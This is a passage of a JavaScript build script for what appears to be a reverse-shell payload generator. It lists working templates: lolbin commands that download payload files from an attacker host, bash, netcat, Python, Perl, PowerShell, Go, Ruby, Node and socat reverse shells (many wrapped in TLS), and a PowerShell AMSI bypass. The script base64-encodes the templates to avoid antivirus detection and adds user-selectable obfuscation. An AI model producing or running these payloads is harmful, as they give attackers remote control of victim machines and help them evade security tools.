  { name: 'InstallUtil', os: 'windows', language: 'cmd', tags: ['lolbin'], template: `C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U http://{ip}:{server_port}/payload.exe`, description: 'InstallUtil execution.' },
  { name: 'Regasm', os: 'windows', language: 'cmd', tags: ['lolbin'], template: `C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U http://{ip}:{server_port}/payload.dll`, description: 'Regasm execution.' },
  { name: 'Regsvcs', os: 'windows', language: 'cmd', tags: ['lolbin'], template: `C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe /U http://{ip}:{server_port}/payload.dll`, description: 'Regsvcs execution.' },
  { name: 'Msbuild', os: 'windows', language: 'cmd', tags: ['lolbin'], template: `C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe http://{ip}:{server_port}/payload.xml`, description: 'Msbuild execution.' },
  { name: 'PresentationHost', os: 'windows', language: 'cmd', tags: ['lolbin'], template: `PresentationHost.exe -debug`, description: 'PresentationHost execution.' },

  // --- BYPASS FOCUSED (10+) ---
  { name: 'Bash Obfuscated 1', os: 'linux', language: 'bash', tags: ['bypass', 'obfuscated'], template: `(b=bash;e=echo;$b -c "$b -i >& /dev/tcp/{ip}/{port} 0>&1")`, description: 'Obfuscated Bash 1.' },
  { name: 'Bash Obfuscated 2', os: 'linux', language: 'bash', tags: ['bypass', 'obfuscated'], template: `w="bash -i >& /dev/tcp/{ip}/{port} 0>&1"; echo $w | base64 -d | bash`, description: 'Base64 pipe.' },
  { name: 'Python Polyglot', os: 'linux', language: 'python', tags: ['bypass', 'polyglot'], template: `<!-- :; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' # -->`, description: 'HTML/Python Polyglot.' },
  { name: 'Perl Polyglot', os: 'linux', language: 'perl', tags: ['bypass', 'polyglot'], template: `<!-- :; perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' # -->`, description: 'HTML/Perl Polyglot.' },
  { name: 'PowerShell Encoded', os: 'windows', language: 'powershell', tags: ['bypass', 'encoded'], template: `powershell -Enc {base64_payload}`, description: 'Encoded PowerShell.' },
  { name: 'PowerShell Hidden', os: 'windows', language: 'powershell', tags: ['bypass', 'hidden'], template: `powershell -w hidden -nop -c "..."`, description: 'Hidden Window.' },
  { name: 'PowerShell NoProfile', os: 'windows', language: 'powershell', tags: ['bypass'], template: `powershell -nop -c "..."`, description: 'No Profile.' },
  { name: 'PowerShell ExecutionPolicy', os: 'windows', language: 'powershell', tags: ['bypass'], template: `powershell -ep bypass -c "..."`, description: 'Bypass Execution Policy.' },
  { name: 'PowerShell Version 2', os: 'windows', language: 'powershell', tags: ['bypass', 'legacy'], template: `powershell -v 2 -c "..."`, description: 'Downgrade to v2.' },
  { name: 'NC Traditional', os: 'linux', language: 'bash', tags: ['bypass'], template: `nc -e /bin/bash {ip} {port}`, description: 'Traditional NC.' },
  { name: 'NC OpenBSD', os: 'linux', language: 'bash', tags: ['bypass'], template: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f`, description: 'OpenBSD NC.' },

  // --- PREMIUM / HIGH SUCCESS (10) ---
  { name: 'PowerShell AMSI Bypass', os: 'windows', language: 'powershell', tags: ['premium', 'bypass', 'amsi'], template: `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); $client = New-Object System.Net.Sockets.TcpClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`, description: 'Disables AMSI before execution.' },
  { name: 'PowerShell Premium SSL', os: 'windows', language: 'powershell', tags: ['premium', 'encrypted', 'ssl'], template: `$s=New-Object Net.Sockets.TcpClient('{ip}',{port});$ssl=New-Object Net.Security.SslStream($s.GetStream(),$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$ssl.AuthenticateAsClient('');$w=New-Object IO.StreamWriter($ssl);$w.AutoFlush=$true;[byte[]]$b=0..65535|%{0};while(($i=$ssl.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$w.Write($r+'PS '+(pwd).Path+'> ')}`, description: 'Full SSL/TLS encrypted shell.' },
  { name: 'Python Premium SSL', os: 'linux', language: 'python', tags: ['premium', 'encrypted', 'ssl'], template: `python -c 'import socket,ssl,subprocess,os;s=socket.socket();s.connect(("{ip}",{port}));w=ssl.wrap_socket(s);os.dup2(w.fileno(),0);os.dup2(w.fileno(),1);os.dup2(w.fileno(),2);subprocess.call(["/bin/sh","-i"])'`, description: 'Python SSL wrapped socket.' },
  { name: 'Bash Premium SSL', os: 'linux', language: 'bash', tags: ['premium', 'encrypted', 'ssl'], template: `mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s`, description: 'Robust OpenSSL shell.' },
  { name: 'Go Premium TLS', os: 'linux', language: 'go', tags: ['premium', 'encrypted', 'tls'], template: `echo 'package main;import"crypto/tls";import"os/exec";func main(){c,_:=tls.Dial("tcp","{ip}:{port}",&tls.Config{InsecureSkipVerify:true});cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go`, description: 'Go TLS encrypted shell.' },
  { name: 'Ruby Premium SSL', os: 'linux', language: 'ruby', tags: ['premium', 'encrypted', 'ssl'], template: `ruby -rnormalized_openssl -e 'c=OpenSSL::SSL::SSLSocket.new(TCPSocket.new("{ip}",{port})).connect;while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`, description: 'Ruby SSL socket.' },
  { name: 'Perl Premium SSL', os: 'linux', language: 'perl', tags: ['premium', 'encrypted', 'ssl'], template: `perl -MIO::Socket::SSL -e '$c=IO::Socket::SSL->new(PeerAddr,"{ip}:{port}",SSL_verify_mode,SSL_VERIFY_NONE);STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`, description: 'Perl SSL socket.' },
  { name: 'NodeJS Premium SSL', os: 'linux', language: 'nodejs', tags: ['premium', 'encrypted', 'ssl'], template: `(function(){var tls=require('tls'),cp=require('child_process'),sh=cp.spawn('/bin/sh',[]);var client=tls.connect({port},{host:'{ip}',rejectUnauthorized:false},function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});})();`, description: 'NodeJS TLS connection.' },
  { name: 'Socat Premium TTY', os: 'linux', language: 'bash', tags: ['premium', 'stable', 'socat'], template: `socat file:\`tty\`,raw,echo=0 openssl-connect:{ip}:{port},verify=0`, description: 'Socat Encrypted TTY.' },
  { name: 'PowerShell FUD', os: 'windows', language: 'powershell', tags: ['premium', 'fud', 'obfuscated'], template: `powershell -nop -w hidden -e {base64_payload}`, description: 'Base64 Encoded & Hidden Window.' }
];

// Generate IDs and Base64 encode templates
const processedShells = rawShells.map((shell, index) => {
  const id = shell.name.toLowerCase().replace(/[^a-z0-9]+/g, '-') + '-' + index;
  const encodedTemplate = Buffer.from(shell.template).toString('base64');
  return {
    id: id,
    name: shell.name,
    os: shell.os,
    language: shell.language,
    tags: shell.tags,
    template: encodedTemplate,
    description: shell.description
  };
});

const fileContent = `// Payloads are Base64 encoded in source to prevent AV flagging during dev.
// The app decodes them, then applies user-selected obfuscation.

export const shells = ${JSON.stringify(processedShells, null, 2)};

export const generatePayload = (shellId, ip, port, obfuscation = 'none') => {
  const shell = shells.find(s => s.id === shellId);
  if (!shell) return '';
  
  try {
    let payload = atob(shell.template);
    
    // Replace placeholders
    payload = payload.replace(/{ip}/g, ip)
                     .replace(/{port}/g, port)
                     .replace(/{server_port}/g, '8000'); // Default server port for downloads

    // Apply obfuscation
    if (obfuscation === 'base64') {
      return btoa(payload);
    } else if (obfuscation === 'url') {
      return encodeURIComponent(payload);
    } else if (obfuscation === 'hex') {
      let hex = '';
      for (let i = 0; i < payload.length; i++) {
        hex += '%' + payload.charCodeAt(i).toString(16).toUpperCase();
      }
      return hex;
    }
    
    return payload;
  } catch (e) {
    console.error('Failed to decode/obfuscate payload', e);
    return 'Error generating payload';
  }
};
`;

fs.writeFileSync(path.join(__dirname, '../src/data/shells.js'), fileContent);
console.log(`Generated ${processedShells.length} payloads.`);
